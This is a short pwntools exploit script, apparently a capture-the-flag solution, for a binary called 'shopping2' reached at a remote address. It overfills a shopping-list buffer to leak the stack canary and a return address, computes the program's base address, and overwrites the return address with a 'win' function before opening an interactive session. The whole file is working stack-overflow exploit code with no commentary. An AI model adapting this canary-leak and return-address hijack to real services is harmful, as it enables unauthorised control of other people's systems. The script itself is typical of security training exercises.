from pwn import *

context.arch = 'amd64'
context.binary = "../src/shopping2"
context.terminal = ['tmux', 'splitw', '-h']

p = remote("10.212.173.64", 32203)
# p = process("./shopping2")

p.recvuntil(b"(1-3): ")
p.sendline(b"1")

p.recvuntil(b"list: ")
p.send(b"249\n")

p.recvuntil(b"data:\n")
p.send(b"A"*245)

p.recvuntil(b"(1-3): ")
p.sendline(b"2")

p.recvuntil(b"list:\n")

buffer = p.recvline().strip()
canary = u64(b"\x00"+buffer[245:252])

p.recvuntil(b"(1-3): ")
p.sendline(b"1")

p.recvuntil(b"list: ")
p.send(b"260\n")
p.recvuntil(b"data:\n")
p.send(b"A"*260)

p.recvuntil(b"(1-3): ")
p.sendline(b"2")
p.recvuntil(b"list:\n")

ret_adr = p.recvline().strip()
ret = u64(ret_adr[260:267] + b"\x00\x00")

base_address = ret-5775
win = base_address + 4620

p.recvuntil(b"(1-3): ")
p.sendline(b"1")

p.recvuntil(b"list: ")
p.send(b"266\n")
p.recvuntil(b"data:\n")
p.send(b"A"*244+p64(canary)+b"A"*8+p64(win))

p.interactive()
